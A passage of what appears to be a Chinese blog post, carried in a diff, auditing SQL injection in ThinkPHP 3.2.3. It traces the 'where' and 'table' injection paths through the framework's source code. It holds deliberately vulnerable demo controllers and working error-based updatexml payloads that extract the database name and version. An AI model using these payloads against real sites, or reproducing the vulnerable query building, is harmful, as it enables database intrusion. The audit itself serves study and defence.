class="string">'01'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'year='</span>.$year.<span class="string">'&amp;month='</span>.$month;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>URL的访问地址分别是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://serverName/index.php/Home/Blog/read/id/5</span><br><span class="line">http://serverName/index.php/Home/Blog/archive/year/2013/month/11</span><br></pre></td></tr></table></figure>
+
+<p><strong>控制器插件</strong></p>
+<p>我们再home同级目录下创建<code>Addon\SystemInfo\Controller</code>目录，并且再创建一个info控制器</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">Addon</span>\<span class="title">SystemInfo</span>\<span class="title">Controller</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">InfoController</span> <span class="keyword">extends</span> \<span class="title">Think</span>\<span class="title">Controller</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么我们访问其inde方法的url地址为</p>
+<blockquote>
+<p>http: / /127.0.0.1/thinkphp/index.php/home/info/index/addon/SystemInfo</p>
+</blockquote>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1587636362189.png" alt="1587636362189"></p>
+<h1 id="SQL注入审计"><a href="#SQL注入审计" class="headerlink" title="SQL注入审计"></a>SQL注入审计</h1><h2 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h2><h3 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a>where注入</h3><p>以字符串的方式将条件作为where()方法的参数时就会产生SQL注入。</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$User = M(<span class="string">"User"</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">$User-&gt;where(<span class="string">'type=1 AND status=1'</span>)-&gt;select(); </span><br></pre></td></tr></table></figure>
+
+<p>最后生成的SQL语句是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> think_user <span class="keyword">WHERE</span> <span class="keyword">type</span>=<span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">status</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>实例：<br>再indexcontroller.class.php中添加一个sql方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'sql注入实例'</span>;</span><br><span class="line">       $a = M(<span class="string">"User"</span>)-&gt;where(<span class="string">'id='</span>.I(<span class="string">'id'</span>))-&gt;find(); </span><br><span class="line">       dump($a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当输入?id=1的时候成功查询到数据，输入单引号时报错，使用小括号和–成功闭合，此时的SQL语句为</p>
+<blockquote>
+<p>SELECT * FROM <code>thinkphp_user</code> WHERE ( id=1) – ) LIMIT 1</p>
+</blockquote>
+<p>使用报错注入爆出数据库名<img src="/2020/05/05/ThinkPHP3.2.3/1587653869748.png" alt="1587653869748"></p>
+<p><strong>分析</strong><br>我们传入的id首先进入 I 方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">I</span><span class="params">($name,$default=<span class="string">''</span>,$filter=null,$datas=null)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> $_PUT	=	<span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">if</span>(strpos($name,<span class="string">'/'</span>))&#123; <span class="comment">// 指定修饰符</span></span><br><span class="line">		<span class="keyword">list</span>($name,$type) 	=	explode(<span class="string">'/'</span>,$name,<span class="number">2</span>);</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(C(<span class="string">'VAR_AUTO_STRING'</span>))&#123; <span class="comment">// 默认强制转换为字符串</span></span><br><span class="line">        $type   =   <span class="string">'s'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(strpos($name,<span class="string">'.'</span>)) &#123; <span class="comment">// 指定参数来源</span></span><br><span class="line">        <span class="keyword">list</span>($method,$name) =   explode(<span class="string">'.'</span>,$name,<span class="number">2</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 默认为自动判断</span></span><br><span class="line">        $method =   <span class="string">'param'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//code</span></span><br><span class="line">	    is_array($data) &amp;&amp; array_walk_recursive($data,<span class="string">'think_filter'</span>);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">.<span class="comment">//code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_filter</span><span class="params">(&amp;$value)</span></span>&#123;</span><br><span class="line">	<span class="comment">// TODO 其他安全过滤</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span>,$value))&#123;</span><br><span class="line">        $value .= <span class="string">' '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 I 方法中进行一次 htmlspecialchars 和 think_filter 的过滤处理后返回$data,之后再经过where方法处理返回<code>options[&#39;where&#39;]</code>，进入find方法，之后再find方法中又进入/ThinkPHP/Library/Think/Model.class.php调用了select方法。<strong>但是可以发现在think_filter过滤时为黑名单过滤 并且常见的updataxml()报错函数等没有过滤，所以可以进行报错注入。</strong><br><img src="/2020/05/05/ThinkPHP3.2.3/1587957048476.png" alt="1587957048476"></p>
+<p>在find方法中的id还是我们传入的1b<br>继续跟进，然后进入_parseOptions函数中进行表达式分析<br><img src="/2020/05/05/ThinkPHP3.2.3/1587957545707.png" alt="1587957545707"></p>
+<p>之后进入到<code>select()</code>方法中</p>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1587966558672.png" alt="1587966558672"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model = $options[<span class="string">'model'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>($options[<span class="string">'bind'</span>]) ? $options[<span class="string">'bind'</span>] : <span class="keyword">array</span>());</span><br><span class="line">        $sql    = <span class="keyword">$this</span>-&gt;buildSelectSql($options);</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;query($sql, !<span class="keyword">empty</span>($options[<span class="string">'fetch_sql'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>, !<span class="keyword">empty</span>($options[<span class="string">'master'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>再进入到<code>buildSelectSql()</code>方法中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildSelectSql</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'page'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 根据页数计算limit</span></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="keyword">$this</span>-&gt;parseSql(<span class="keyword">$this</span>-&gt;selectSql, $options);</span><br><span class="line">        <span class="keyword">return</span> $sql;<span class="comment">//SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入到<code>parseSql()</code>中，该方法主要用来利于前面获取的各字段信息，拼接SQL语句。<br>在此方法中，直接取出$options[‘table’]的值作为查询语句中的table</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseSql</span><span class="params">($sql, $options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $sql = str_replace(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'%TABLE%'</span>, <span class="string">'%DISTINCT%'</span>, <span class="string">'%FIELD%'</span>, <span class="string">'%JOIN%'</span>, <span class="string">'%WHERE%'</span>, <span class="string">'%GROUP%'</span>, <span class="string">'%HAVING%'</span>, <span class="string">'%ORDER%'</span>, <span class="string">'%LIMIT%'</span>, <span class="string">'%UNION%'</span>, <span class="string">'%LOCK%'</span>, <span class="string">'%COMMENT%'</span>, <span class="string">'%FORCE%'</span>),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseDistinct(<span class="keyword">isset</span>($options[<span class="string">'distinct'</span>]) ? $options[<span class="string">'distinct'</span>] : <span class="keyword">false</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseField(!<span class="keyword">empty</span>($options[<span class="string">'field'</span>]) ? $options[<span class="string">'field'</span>] : <span class="string">'*'</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseJoin(!<span class="keyword">empty</span>($options[<span class="string">'join'</span>]) ? $options[<span class="string">'join'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>($options[<span class="string">'where'</span>]) ? $options[<span class="string">'where'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseGroup(!<span class="keyword">empty</span>($options[<span class="string">'group'</span>]) ? $options[<span class="string">'group'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseHaving(!<span class="keyword">empty</span>($options[<span class="string">'having'</span>]) ? $options[<span class="string">'having'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseOrder(!<span class="keyword">empty</span>($options[<span class="string">'order'</span>]) ? $options[<span class="string">'order'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLimit(!<span class="keyword">empty</span>($options[<span class="string">'limit'</span>]) ? $options[<span class="string">'limit'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseUnion(!<span class="keyword">empty</span>($options[<span class="string">'union'</span>]) ? $options[<span class="string">'union'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLock(<span class="keyword">isset</span>($options[<span class="string">'lock'</span>]) ? $options[<span class="string">'lock'</span>] : <span class="keyword">false</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseComment(!<span class="keyword">empty</span>($options[<span class="string">'comment'</span>]) ? $options[<span class="string">'comment'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseForce(!<span class="keyword">empty</span>($options[<span class="string">'force'</span>]) ? $options[<span class="string">'force'</span>] : <span class="string">''</span>),</span><br><span class="line">            ), $sql);</span><br><span class="line">        <span class="keyword">return</span> $sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里主要查看parseWhere方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhere</span><span class="params">($where)</span> </span>&#123;</span><br><span class="line">    $whereStr = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span>(is_string($where)) &#123;</span><br><span class="line">        <span class="comment">// 直接使用字符串条件</span></span><br><span class="line">        $whereStr = $where;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 使用数组表达式</span></span><br><span class="line">        $operate  = <span class="keyword">isset</span>($where[<span class="string">'_logic'</span>])?strtoupper($where[<span class="string">'_logic'</span>]):<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(in_array($operate,<span class="keyword">array</span>(<span class="string">'AND'</span>,<span class="string">'OR'</span>,<span class="string">'XOR'</span>)))&#123;</span><br><span class="line">            <span class="comment">// 定义逻辑运算规则 例如 OR XOR AND NOT</span></span><br><span class="line">            $operate    =   <span class="string">' '</span>.$operate.<span class="string">' '</span>;</span><br><span class="line">            <span class="keyword">unset</span>($where[<span class="string">'_logic'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 默认进行 AND 运算</span></span><br><span class="line">            $operate    =   <span class="string">' AND '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> ($where <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_numeric($key))&#123;</span><br><span class="line">                $key  = <span class="string">'_complex'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span>===strpos($key,<span class="string">'_'</span>)) &#123;</span><br><span class="line">                <span class="comment">// 解析特殊条件表达式</span></span><br><span class="line">                $whereStr   .= <span class="keyword">$this</span>-&gt;parseThinkWhere($key,$val);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">// 查询字段的安全过滤</span></span><br><span class="line">                <span class="comment">// if(!preg_match('/^[A-Z_\|\&amp;\-.a-z0-9\(\)\,]+$/',trim($key)))&#123;</span></span><br><span class="line">                <span class="comment">//     E(L('_EXPRESS_ERROR_').':'.$key);</span></span><br><span class="line">                <span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后跟进一下parseThinkwhere方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseThinkWhere</span><span class="params">($key,$val)</span> </span>&#123;</span><br><span class="line">    $whereStr   = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">switch</span>($key) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'_string'</span>:</span><br><span class="line">            <span class="comment">// 字符串模式查询条件</span></span><br><span class="line">            $whereStr = $val;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'_complex'</span>:</span><br><span class="line">            <span class="comment">// 复合查询条件</span></span><br><span class="line">            $whereStr = substr(<span class="keyword">$this</span>-&gt;parseWhere($val),<span class="number">6</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'_query'</span>:</span><br><span class="line">            <span class="comment">// 字符串模式查询条件</span></span><br><span class="line">            parse_str($val,$where);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($where[<span class="string">'_logic'</span>])) &#123;</span><br><span class="line">                $op   =  <span class="string">' '</span>.strtoupper($where[<span class="string">'_logic'</span>]).<span class="string">' '</span>;</span><br><span class="line">                <span class="keyword">unset</span>($where[<span class="string">'_logic'</span>]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $op   =  <span class="string">' AND '</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $array   =  <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> ($where <span class="keyword">as</span> $field=&gt;$data)</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($field).<span class="string">' = '</span>.<span class="keyword">$this</span>-&gt;parseValue($data);</span><br><span class="line">            $whereStr   = implode($op,$array);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'( '</span>.$whereStr.<span class="string">' )'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$key为_string，所以$whereStr为传入的参数的值，最后parserWhere方法返回(id=1p)<br><code>parseSql()</code>中拼接时将$option[‘where’]作为了where部分，拼接后导致注入<br>返回最终的sql语句</p>
+<blockquote>
+<p>SELECT * FROM <code>thinkphp_user</code> WHERE ( id=1 ) LIMIT 1</p>
+</blockquote>
+<p>所以构造payload返回的SQL语句为</p>
+<blockquote>
+<p>SELECT * FROM <code>thinkphp_user</code> WHERE ( id=1) and updatexml(1,concat(0x7e,database(),0x7e),1)– ) LIMIT 1</p>
+</blockquote>
+<h3 id="table注入"><a href="#table注入" class="headerlink" title="table注入"></a>table注入</h3><p>table方法也属于模型类的连贯操作方法之一，主要用于指定操作的数据表。</p>
+<p><strong>用法</strong></p>
+<p>一般情况下，操作模型的时候系统能够自动识别当前对应的数据表，所以，使用table方法的情况通常是为了切换操作的数据表或者对多表进行操作；</p>
+<p>例如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Model-&gt;table('think_user')-&gt;where('status&gt;1')-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>也可以在table方法中指定数据库，例如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Model-&gt;table('db_name.think_user')-&gt;where('status&gt;1')-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>table方法指定的数据表需要完整的表名，但可以采用下面的方式简化数据表前缀的传入，例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Model-&gt;table('__USER__')-&gt;where('status&gt;1')-&gt;select();</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
+
+<p>会自动获取当前模型对应的数据表前缀来生成 <code>think_user</code> 数据表名称。</p>
+<p><strong>实例</strong></p>
+<p>再indexcontroller.class.php中添加一个sql_table方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_table</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'sql注入实例'</span>;</span><br><span class="line">    M()-&gt;table(I(<span class="string">'tab'</span>))-&gt;where(<span class="string">'1=1'</span>)-&gt;find();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当输入一个不存在的表时显示错误</p>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1587952081549.png" alt="1587952081549"></p>
+<p>当输入的表存在时返回正常，执行了</p>
+<blockquote>
+<ol>
+<li>SHOW COLUMNS FROM <code>thinkphp_user</code> [ RunTime:0.0016s ]</li>
+<li>SELECT * FROM <code>thinkphp_user</code> WHERE ( 1=1 ) LIMIT 1   [ RunTime:0.0045s ]</li>
+</ol>
+</blockquote>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1587952107733.png" alt="1587952107733"></p>
+<p><strong>分析</strong><br>传入?tab=qwe，当我们查询一个不存在的表时，首先进入了table方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">table</span><span class="params">($table)</span> </span>&#123;</span><br><span class="line">    $prefix =   <span class="keyword">$this</span>-&gt;tablePrefix;</span><br><span class="line">    <span class="keyword">if</span>(is_array($table)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'table'</span>] =   $table;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(!<span class="keyword">empty</span>($table)) &#123;</span><br><span class="line">        <span class="comment">//将__TABLE_NAME__替换成带前缀的表名</span></span><br><span class="line">        $table  = preg_replace_callback(<span class="string">"/__([A-Z0-9_-]+)__/sU"</span>, <span class="function"><span class="keyword">function</span><span class="params">($match)</span> <span class="title">use</span><span class="params">($prefix)</span></span>&#123; <span class="keyword">return</span> $prefix.strtolower($match[<span class="number">1</span>]);&#125;, $table);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'table'</span>] =   $table;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1587952419329.png" alt="1587952419329"></p>
+<p>之后进入where方法，但由于where为1=1恒成立，所以不用管。继续F7跟进，之后将语句组合后给query去查询</p>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1587982883610.png" alt="1587982883610"></p>
+<p>由于表不存在，所以查询错误，最终会进入error方法<br><img src="/2020/05/05/ThinkPHP3.2.3/1587984526886.png" alt="1587984526886"></p>
+<p>当传入</p>
+<blockquote>
+<p>tab=thinkphp_user where 1=1 and updatexml(1,concat(0x7e,version(),0x7e),1)%23</p>
+</blockquote>
+<p>时，由于表存在，所以可以执行后面的语句，从而达到报错注入的目的</p>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1587984645897.png" alt="1587984645897"></p>
+<p> 依然是传入的payload经过I()-&gt;table()-&gt;where()方法后进入find()方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span><span class="params">($options=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($options) || is_string($options)) &#123;</span><br><span class="line">        $where[<span class="keyword">$this</span>-&gt;getPk()]  =   $options;</span><br><span class="line">        $options                =   <span class="keyword">array</span>();</span><br><span class="line">        $options[<span class="string">'where'</span>]       =   $where;</span><br><span class="line">    &#125;</span><br><span class="line">            <span class="comment">// 根据复合主键查找记录</span></span><br><span class="line">    $pk  =  <span class="keyword">$this</span>-&gt;getPk();</span><br></pre></td></tr></table></figure>
+
+<p>这里由于我们传入的$options为数组，所以绕过了第一个if判断</p>
+<p>$pk的值是当前表的主键信息：</p>
+<blockquote>
+<p>若当前表仅有一个主键，则$pk的值为string</p>
+<p>若当前表有多个主键，这$pk的值是以数组的形式存在</p>
+<p>当$pk为string类型时，会导致接下来的部分判断绕过；否则payload不生效</p>
+</blockquote>
+<p>接下来的语句块是根据复合主键查询，因此处表为单主键，$pk为字符串类型，因此绕过判断</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据复合主键查找记录</span></span><br><span class="line">$pk  =  <span class="keyword">$this</span>-&gt;getPk();</span><br><span class="line"><span class="keyword">if</span> (is_array($options) &amp;&amp; (count($options) &gt; <span class="number">0</span>) &amp;&amp; is_array($pk)) &#123;</span><br><span class="line">    <span class="comment">// 根据复合主键查询</span></span><br><span class="line">    $count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($options) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_int($key)) $count++; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span> ($count == count($pk)) &#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($pk <span class="keyword">as</span> $field) &#123;</span><br><span class="line">            $where[$field] = $options[$i];</span><br><span class="line">            <span class="keyword">unset</span>($options[$i++]);</span><br><span class="line">        &#125;</span><br><span class="line">        $options[<span class="string">'where'</span>]  =  $where;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 总是查找一条记录</span></span><br><span class="line">$options[<span class="string">'limit'</span>]   =   <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 分析表达式</span></span><br><span class="line">$options            =   <span class="keyword">$this</span>-&gt;_parseOptions($options);</span><br><span class="line"><span class="comment">// 判断查询缓存</span></span><br></pre></td></tr></table></figure>
+
+<p>接着进入到<code>_parseOptions($options)</code><br>这里的<code>$options</code>可控，同时在payload中<code>$options</code>仅存在table字段，不存在where字段，可顺利通过函数验证</p>
